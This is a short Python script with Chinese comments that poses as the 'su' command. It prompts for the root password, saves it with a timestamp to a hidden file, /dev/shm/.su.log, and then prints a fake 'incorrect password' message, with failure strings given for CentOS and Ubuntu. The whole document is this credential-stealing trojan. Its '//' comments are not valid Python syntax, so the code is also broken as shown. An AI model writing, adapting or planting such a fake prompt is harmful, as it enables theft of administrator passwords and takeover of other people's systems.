#!/usr/bin/python
import os, sys, getpass, time
 
current_time = time.strftime("%Y-%m-%d %H:%M")
logfile="/dev/shm/.su.log"              //密码获取后记录在这里
#CentOS                 
#fail_str = "su: incorrect password"
#Ubuntu              
#fail_str = "su: Authentication failure"
#For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样
fail_str = "su: incorrect password"
try:
    passwd = getpass.getpass(prompt='Password: ');
    file=open(logfile,'a')
    file.write("[%s]t%s"%(passwd, current_time))   //截取root密码
    file.write('n')
    file.close()
except:
    pass
time.sleep(1)
print fail_str                               //打印切换root失败提示